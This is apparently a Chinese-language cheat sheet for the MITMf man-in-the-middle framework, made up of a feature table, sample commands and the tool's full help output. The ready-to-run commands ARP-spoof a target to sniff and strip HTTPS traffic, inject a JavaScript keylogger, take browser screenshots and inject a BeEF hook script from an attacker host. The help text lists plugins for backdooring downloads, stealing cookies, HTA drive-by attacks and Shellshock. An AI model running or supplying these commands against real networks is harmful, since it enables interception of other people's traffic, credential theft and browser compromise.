## MITMf

* github: [https://github.com/byt3bl33d3r/MITMf](https://github.com/byt3bl33d3r/MITMf)

### 基本功能

功能 | 描述
 --- | ----
sslstrip | 部分绕过HSTS,将https降级为http协议。默认是开启的状态
Filepwn | 主要作用是当被欺骗对象尝试下载文件时，首先对文件进行分析，对可执行文件（PE、ELF）进行后门注入，然后再给到被欺骗对象
Cachekill | 清空客户端的缓存缓冲池，这个在我们需要重新注入一段js时是很有用的。
Spoof | 欺骗模块。当我们使用MITM功能攻击欺骗时绝对是不能缺少的。其主要包括对ARP、ICMP、DHCP进行流量重定向（三种模式不能同时使用）
BeEFAutorun | 该模块可以使框架可以连接到BeEF，将MITM与浏览器渗透结合起来
Replace | 可以对浏览内容进行替换，支持正则表达式。注意，这里模块默认情况下是强制刷新缓存缓冲池的，要想不改变缓冲内容，需要手动指定keep-cache参数
Inject | 可以向被欺骗者的浏览内容中注入各种猥琐的东西，比如js，html，图片，电影。
Browser Profiler | 枚举被欺骗机器的浏览器插件。对于前期的信息收集阶段还是很有用的。
JavaPwn | 可以通过向被攻击机器中注入jar使得浏览内容被毒化，和metasploit联合可以直接渗透机器拿到shell
Javascript Keylogger  | 一个键盘记录js
App Cache Poison | app缓存投毒。对于网页应用程序进行毒化处理，然后进行随心所欲的攻击。是Krzysztof Kotowicz的补充模块。
Upsidedownternet | 恶搞模块，图片旋转180度。
RedirectsBrowserProfiler | 这个插件可以检测目标的浏览器类型，这将有助于识别漏洞
HTA Drive-By | 注入一个假的更新通知，并提示客户下载一个HTA应用
AppCachePoison  | 执行HTML5的App-缓存中毒攻击
BrowserSniper | 执行与外的最新浏览器插件在客户端上HTA Drive-by攻击

### sample

* 嗅探SSL传输的数据包

  -a参数表示对http和https的数据包都嗅探

  `python mitmf.py -i eth0 --hsts -a --spoof --arp --gateway 10.0.0.1 --target 10.0.0.18`


* 目标浏览器截屏

  `python mitmf.py -i eth0 --spoof --arp --gateway 192.168.1.1 --target 192.168.1.100 --screen`

* 恶搞功能: 它可以使目标浏览网页时，所有的图片都倒转 180度。

  `python mitmf.py --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.100 --upsidedownternet`

* 键盘记录

  `python mitmf.py --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.100 --jskeylogger`

* 替换

  `python mitmf.py -i eth0 --spoof  --arp --gateway 192.168.1.1 --target 1192.168.1.100 --replace --search-str "百度" --replace-str "xxx"`



## with beef

运行 beef: ` cd /usr/share/beef-xss && ./beef`

`python mitmf.py --spoof --arp -i eth0 --gateway 192.168.1.1 --target 192.168.1.114 --inject -–js-url http://192.168.1.110:3000/hook.js`

## with metasploite

连通性设置：

```
$ msfconsole
msf>load msgrpc Pass=abc123
```

### usage

```
usage: mitmf.py -i interface [mitmf options] [plugin name] [plugin options]

MITMf v0.9.8 - 'The Dark Side'

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit

MITMf:
  Options for MITMf

  --log-level {debug,info}
                        Specify a log level [default: info]
  -i INTERFACE          Interface to listen on
  -c CONFIG_FILE        Specify config file to use
  -p, --preserve-cache  Don't kill client/server caching
  -r READ_PCAP, --read-pcap READ_PCAP
                        Parse specified pcap for credentials and exit
  -l PORT               Port to listen on (default 10000)
  -f, --favicon         Substitute a lock favicon on secure requests.
  -k, --killsessions    Kill sessions in progress.
  -F FILTER [FILTER ...], --filter FILTER [FILTER ...]
                        Filter to apply to incoming traffic

Inject:
  Inject arbitrary content into HTML content

  --inject              Load plugin 'Inject'
  --js-url JS_URL       URL of the JS to inject
  --js-payload JS_PAYLOAD
                        JS string to inject
  --js-file JS_FILE     File containing JS to inject
  --html-url HTML_URL   URL of the HTML to inject
  --html-payload HTML_PAYLOAD
                        HTML string to inject
  --html-file HTML_FILE
                        File containing HTML to inject
  --per-domain          Inject once per domain per client.
  --rate-limit RATE_LIMIT
                        Inject once every RATE_LIMIT seconds per client.
  --count-limit COUNT_LIMIT
                        Inject only COUNT_LIMIT times per client.
  --white-ips IP        Inject content ONLY for these ips (comma seperated)
  --black-ips IP        DO NOT inject content for these ips (comma seperated)
  --white-domains DOMAINS
                        Inject content ONLY for these domains (comma seperated)
  --black-domains DOMAINS
                        DO NOT inject content for these domains (comma seperated)

ScreenShotter:
  Uses HTML5 Canvas to render an accurate screenshot of a clients browser

  --screen              Load plugin 'ScreenShotter'
  --interval SECONDS    Interval at which screenshots will be taken (default 10 seconds)

Responder:
  Poison LLMNR, NBT-NS and MDNS requests

  --responder           Load plugin 'Responder'
  --analyze             Allows you to see NBT-NS, BROWSER, LLMNR requests without poisoning
  --wredir              Enables answers for netbios wredir suffix queries
  --nbtns               Enables answers for netbios domain suffix queries
  --fingerprint         Fingerprint hosts that issued an NBT-NS or LLMNR query
  --lm                  Force LM hashing downgrade for Windows XP/2003 and earlier
  --wpad                Start the WPAD rogue proxy server
  --forcewpadauth       Force NTLM/Basic authentication on wpad.dat file retrieval (might cause a login prompt)
  --basic               Return a Basic HTTP authentication. If not set, an NTLM authentication will be returned

ImageRandomizer:
  Replaces images with a random one from a specified directory

  --imgrand             Load plugin 'ImageRandomizer'
  --img-dir DIRECTORY   Directory with images

BrowserProfiler:
  Attempts to enumerate all browser plugins of connected clients

  --browserprofiler     Load plugin 'BrowserProfiler'

Spoof:
  Redirect/Modify traffic using ICMP, ARP, DHCP or DNS

  --spoof               Load plugin 'Spoof'
  --arp                 Redirect traffic using ARP spoofing
  --icmp                Redirect traffic using ICMP redirects
  --dhcp                Redirect traffic using DHCP offers
  --dns                 Proxy/Modify DNS queries
  --netmask NETMASK     The netmask of the network
  --shellshock PAYLOAD  Trigger the Shellshock vuln when spoofing DHCP, and execute specified command
  --gateway GATEWAY     Specify the gateway IP
  --gatewaymac GATEWAYMAC
                        Specify the gateway MAC [will auto resolve if ommited]
  --targets TARGETS     Specify host/s to poison [if ommited will default to subnet]
  --ignore IGNORE       Specify host/s not to poison
  --arpmode {rep,req}    ARP Spoofing mode: replies (rep) or requests (req) [default: rep]

HTA Drive-By:
  Performs HTA drive-by attacks on clients

  --hta                 Load plugin 'HTA Drive-By'
  --text TEXT           Text to display on notification bar
  --hta-app HTA_APP     Path to HTA application [defaults to config/hta_driveby/flash_setup.hta]

SMBAuth:
  Evoke SMB challenge-response auth attempts

  --smbauth             Load plugin 'SMBAuth'

BrowserSniper:
  Performs drive-by attacks on clients with out-of-date browser plugins

  --browsersniper       Load plugin 'BrowserSniper'

Replace:
  Replace arbitrary content in HTML content

  --replace             Load plugin 'Replace'

AppCachePoison:
  Performs App Cache Poisoning attacks

  --appoison            Load plugin 'AppCachePoison'

FilePwn:
  Backdoor executables being sent over http using bdfactory

  --filepwn             Load plugin 'FilePwn'

Upsidedownternet:
  Flips images 180 degrees

  --upsidedownternet    Load plugin 'Upsidedownternet'

SMBTrap:
  Exploits the SMBTrap vulnerability on connected clients

  --smbtrap             Load plugin 'SMBTrap'

Ferret-NG:
  Captures cookies and starts a proxy that will feed them to connected clients

  --ferretng            Load plugin 'Ferret-NG'
  --port PORT           Port to start Ferret-NG proxy on (default 10010)
  --load-cookies FILE   Load cookies from a log file

Captive Portal:
  Be a captive portal!

  --captive             Load plugin 'Captive Portal'
  --portalurl URL       Specify the URL where the portal is located, e.g. http://example.com.
  --portaldir LOCALDIR  Specify a local path containg the portal files served with a SimpleHTTPServer on a different port (see config).
  --use-dns             Whether we use dns spoofing to serve from a fancier portal URL captive.portal when used without options or portaldir. Requires DNS for "captive.portal" to resolve, e.g. via configured dns spoofing --dns.

JSKeylogger:
  Injects a javascript keylogger into clients webpages

  --jskeylogger         Load plugin 'JSKeylogger'

SSLstrip+:
  Enables SSLstrip+ for partial HSTS bypass

  --hsts                Load plugin 'SSLstrip+'
```
